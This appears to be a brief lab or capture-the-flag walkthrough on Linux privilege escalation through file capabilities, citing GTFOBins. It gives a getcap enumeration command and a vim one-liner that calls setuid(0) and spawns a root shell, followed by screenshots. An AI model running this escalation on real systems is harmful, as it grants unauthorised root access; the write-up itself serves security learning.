<https://gtfobins.github.io/#+capabilities>

Used to list enabled capabilities, and we're using 2>/dev/null to redirect errors to /dev/null:
getcap -r / 2>/dev/null

in this example we found a vim capabilities binary. Thankfully gtfobins had a powerful binary for it.
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

Misconfigurations are quite lovely sometimes :)
![unnamed_16e5dab91f2c45469bd5e218023be108](unnamed_16e5dab91f2c45469bd5e218023be108.png)
![unnamed_140fcf6c4def4018b1f0662aa8760ee3](unnamed_140fcf6c4def4018b1f0662aa8760ee3.png)
![unnamed_22e5c990d02c4ec782a2aefc1662bb02](unnamed_22e5c990d02c4ec782a2aefc1662bb02.png)
